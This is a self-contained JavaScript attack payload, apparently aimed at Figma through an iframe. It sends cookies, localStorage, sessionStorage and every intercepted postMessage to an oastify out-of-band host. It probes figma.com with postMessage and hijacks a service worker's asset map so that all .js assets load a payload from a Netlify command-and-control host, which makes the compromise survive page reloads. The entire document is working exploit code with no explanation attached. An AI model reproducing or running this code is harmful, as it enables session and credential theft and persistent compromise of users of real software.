(function () {
    const C2 = 'https://gleeful-creponne-8ff162.netlify.app';
    const OOB = 'https://n6u4chbqezxncoq47ydz4ge9q0wrkh86.oastify.com'; // your oastify

    function exfil(tag, data) {
      const payload = typeof data === 'string' ? data : JSON.stringify(data);
      // sendBeacon no-cors — no CORS needed for exfil
      navigator.sendBeacon(OOB + '/p?t=' + tag, payload);
      // img fallback
      new Image().src = OOB + '/i?t=' + tag + '&d=' + encodeURIComponent(payload).slice(0, 1800);
    }

    // 1. Dump context
    exfil('ctx', {
      origin: location.origin,
      href: location.href,
      cookie: document.cookie,
      ls: JSON.stringify(Object.fromEntries(
        Object.keys(localStorage).map(k => [k, localStorage.getItem(k)])
      )),
      ss: JSON.stringify(Object.fromEntries(
        Object.keys(sessionStorage).map(k => [k, sessionStorage.getItem(k)])
      ))
    });

    // 2. Listen for ALL postMessages flowing through the iframe
    // (figma.com → iframe traffic you already know about)
    window.addEventListener('message', e => {
      exfil('pm', {
        from: e.origin,
        data: typeof e.data === 'string' ? e.data : JSON.stringify(e.data)
      });
    }, true); // capture phase — catches everything

    // 3. Fire your known working postMessage vectors at figma.com
    // Replace with whatever payload you've already confirmed works
    if (window.top !== window) {
      window.top.postMessage('__figma_probe__', 'https://www.figma.com');
      window.parent.postMessage('__figma_probe__', 'https://www.figma.com');
    }

    // 4. Re-poison the SW so next page load still gets our payload
    // (self-perpetuating — survives until user clears SW cache manually)
    if (navigator.serviceWorker && navigator.serviceWorker.controller) {
      const ctrl = navigator.serviceWorker.controller;
      const orig = ctrl.postMessage.bind(ctrl);
      ctrl.postMessage = function (msg) {
        if (msg && msg.type === 'update-asset-url-map' && msg.assets) {
          const poisoned = { ...msg.assets };
          for (const k of Object.keys(poisoned)) {
            if (k.endsWith('.js')) poisoned[k] = C2 + '/payload.js';
          }
          return orig({ ...msg, assets: poisoned });
        }
        return orig(msg);
      };
      exfil('sw_repoisoned', { ok: true });
    }
  })();
